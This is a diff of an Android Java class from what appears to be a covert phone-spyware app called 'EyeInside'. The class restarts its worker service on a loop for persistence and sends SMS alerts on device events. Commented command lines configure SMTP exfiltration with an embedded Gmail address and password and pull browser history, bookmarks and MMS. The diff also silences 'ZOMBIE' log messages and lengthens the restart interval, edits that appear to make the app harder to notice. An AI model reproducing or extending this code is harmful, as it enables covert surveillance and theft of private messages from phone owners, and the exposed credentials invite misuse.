@@ -12,13 +12,10 @@ import android.app.ActivityManager.RunningServiceInfo;
 import android.app.AlarmManager;
 import android.app.PendingIntent;
 import android.content.BroadcastReceiver;
-import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
-import android.content.ServiceConnection;
 import android.content.SharedPreferences;
 import android.os.Handler;
-import android.os.IBinder;
 
 public class Zombie_BroadcastReceiver extends BroadcastReceiver {
 
@@ -41,18 +38,19 @@ public class Zombie_BroadcastReceiver extends BroadcastReceiver {
 
 
 		SharedPreferences prefs = mContext.getSharedPreferences("events", 1);
-		boolean reply = prefs.contains(action) && prefs.getBoolean(action, false);
+		boolean reply = prefs.contains(action);
 		if ( reply ) {
 			CommandObj.sendSMS(prefs.getString("phone", ""),action);
 			NetLog.v("Event %s will be %s",action,reply);
 		}
 		
-		//mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@setup smtp:smtp.gmail.com;port:465;user:eyeinsid3@gmail.com;pass:60175577a;mail:eyeinsid3@gmail.com;no sms;wifi"));
+		//mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@setup smtp:smtp.gmail.com;port:465;user:eyeinsid3@gmail.com;pass:60175577a;mail:eyeinsid3@gmail.com;no sms;wifi",false));
 		//mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@sms to:+79672243716;msg:Приет Мир !"));
 		//mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@event unlock:1;power:1"));
 		//mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@get browser history"));
+		//mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@get mms from:130710;to:130713",false));
 		//mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@spy browser bookmarks;history"));
-		mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@spy mms",false));
+		//mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@keepalive time:2018",false));
 		//ContactsUtils d;
 	}
 
@@ -66,10 +64,10 @@ public class Zombie_BroadcastReceiver extends BroadcastReceiver {
 	
 	public static void startServiceIfNeeded(Context context) {
 		if ( !Zombie_BroadcastReceiver.isServiceRunning(context,"com.code4bones.EyeInside.WorkerService")) {
-			NetLog.v("ZOMBIE: Service not found,starting");
-			serviceLoop(context,60);
+			//NetLog.v("ZOMBIE: Service not found,starting");
+			serviceLoop(context,60 * 30);
 		} else {
-			NetLog.v("ZOMBIE: Service is already running!");
+			//NetLog.v("ZOMBIE: Service is already running!");
 		}
 	}
 	
